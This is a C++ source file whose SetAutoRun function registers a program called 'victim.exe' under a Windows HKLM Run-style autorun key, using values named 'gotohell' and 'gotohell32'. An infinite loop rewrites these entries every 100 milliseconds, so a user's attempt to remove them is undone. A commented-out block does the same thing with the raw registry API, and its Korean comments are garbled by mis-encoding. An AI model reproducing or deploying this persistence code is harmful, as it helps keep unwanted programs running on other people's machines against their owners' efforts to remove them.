#include"main.h"


void SetAutoRun() 
{

	CRegKey regkey;
	int errcode = 0;
	errcode = regkey.Open(HKEY_LOCAL_MACHINE, ADMIN_AUTORUN);
	if (errcode == ERROR_SUCCESS) {
		while (1)
		{
			regkey.SetStringValue(L"gotohell32", L"\"c:\\program files (x86)\\victim.exe\"");
			regkey.SetStringValue(L"gotohell", L"\"c:\\program files\\victim.exe\"");
			//
			Sleep(100);
		}
	}
	cout << GetLastError() << endl;
	
	/*TCHAR value[100] = { 0, };
	ULONG size = 200;
	errcode = regkey.Open(HKEY_LOCAL_MACHINE, ADMIN_AUTORUN);
	regkey.QueryMultiStringValue(L"gotohell32",value,&size);
	MessageBox(NULL, L"hello", L"ok", MB_OK);*/
	//regkey.QueryStringValue(L"Run",value,&size);
	//wcout << GetLastError()<<value << endl;
	regkey.Close();
	return;
	
}
//https://xenostudy.tistory.com/361
//https://bstyle.tistory.com/34
//https://nowprogramming.tistory.com/53
//http://tsc78.blogspot.com/2009/10/cregkey-%EC%82%AC%EC%9A%A9-%EC%98%88%EC%A0%9C.html    <---�߿�




/*LONG errcode = 0;
	DWORD dwtype;
	HKEY hkey = { 0, };
	DWORD dwname_size = 256;
	char name[256] = { 0, };
	DWORD dwdesc;
	CRegKey regkey;
	errcode = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);


	errcode = RegCreateKeyEx(
		HKEY_LOCAL_MACHINE,					//������ Ű�� ��ƮŰ
		ADMIN_AUTORUN,						//������ ����Ű
		0,									//����� ���� (0����)
		NULL,								//Ű�� ������ Ŭ������(���� NULL)
		REG_OPTION_NON_VOLATILE,			//������ ���Ͽ� ����ϴ� �÷���
		KEY_ALL_ACCESS,						//��� ���� ����
		NULL,								//�ڽ� ���μ�����Ӱ���(����NULL)
		&hkey,								//������ Ű �ڵ� ������ RegCloseKey�� Ű��������
		&dwdesc								//������ Ű�� ���¸� �˷���(���� NULL)
	);										//��ȯ�� : REG_CREATED_NEW_KEY : ���� ������ Ű
											//		 : REG_OPENED_EXISTING_KEY : ������ �����ϴ� Ű





	if (errcode != ERROR_SUCCESS)
	{

		SystemError(L"RegCreateKeyError");
		return;
	}
	errcode = RegQueryValueEx(hkey, L"gotohell", NULL, &dwtype, (LPBYTE)name, &dwname_size);
	if (errcode == ERROR_SUCCESS)
	{
		cout << "ok" << endl;
		return;
	}
	else
	{
		cout << "Reg Find failed " << endl;
		cout << "Create Autorun...." << endl;

	}

	TCHAR path_system32[] = CURRENT_FILE_PATH_SYSTEM32;
	TCHAR path_system[] = CURRENT_FILE_PATH_SYSTEM;

	errcode = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
		ADMIN_AUTORUN,
		NULL,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hkey,
		NULL
	);
	TCHAR path_system32A[] = L"C:\\Windows\\System32\\victim.exe";
	TCHAR path_systemA[] = L"C:\\Windows\\System\\victim.exe";
	if (errcode == ERROR_SUCCESS)
	{
		//RegSetValueEx(hkey, L"gotohell", NULL, REG_SZ, (byte*)path_system32A, sizeof(path_system32A));
		//RegSetValueEx(hkey, L"gotohell", NULL, REG_SZ, (byte*)path_systemA, sizeof(path_systemA));
		regkey.Create(HKEY_LOCAL_MACHINE, ADMIN_AUTORUN);
		regkey.SetValue(L"gotohell", path_system32);
		regkey.Close();
	}

	RegCloseKey(hkey);
	*/